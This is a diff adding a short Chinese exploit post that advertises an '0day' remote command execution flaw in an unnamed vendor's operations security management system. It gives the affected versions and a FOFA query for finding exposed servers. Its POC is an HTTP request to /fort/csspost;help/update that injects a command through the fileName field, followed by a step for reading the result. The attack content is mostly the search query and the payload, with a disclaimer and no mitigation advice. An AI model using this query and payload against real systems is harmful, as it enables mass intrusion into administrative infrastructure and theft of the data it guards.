@@ -1,0 +1,28 @@
+#  【0day】某知名厂商运维安全管理系统 csspost/update 远程命令执行漏洞  
+ 0day收割机   2026-03-08 05:22  
+  
+# 漏洞简介  
+  
+某知名厂商  
+运维安全管理系统 csspost/update 接口存在远程命令执行漏洞。攻击者可通过构造恶意的请求，利用该漏洞在目标服务器上执行任意命令，从而可能导致服务器被完全控制、敏感数据泄露等严重后果。  
+# 影响版本  
+  
+低于 3.0.12 20241106  
+# fofa语法  
+> body="/fort/login" && header="FORTSESSIONID"  
+  
+## POC  
+```
+POST /fort/csspost;help/update HTTP/1.1
+Host:
+Content-Type: application/x-www-form-urlencoded
+
+fileName=1.zip;RCE_POC
+```  
+  
+访问命令执行结果文件  
+  
+![](https://mmbiz.qpic.cn/mmbiz_png/ZrTsB3aQgWAVRibibZZRZG1BEDfqIe04wn9Dbh8qTkqHApbPwwiaVbjDg11gLibPbOFcyicWgEJmMlCKx65h41ItlfIuVzrmMByB0I0gEBj0Wgo8/640?wx_fmt=png&from=appmsg "")  
+  
+仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。  
+  
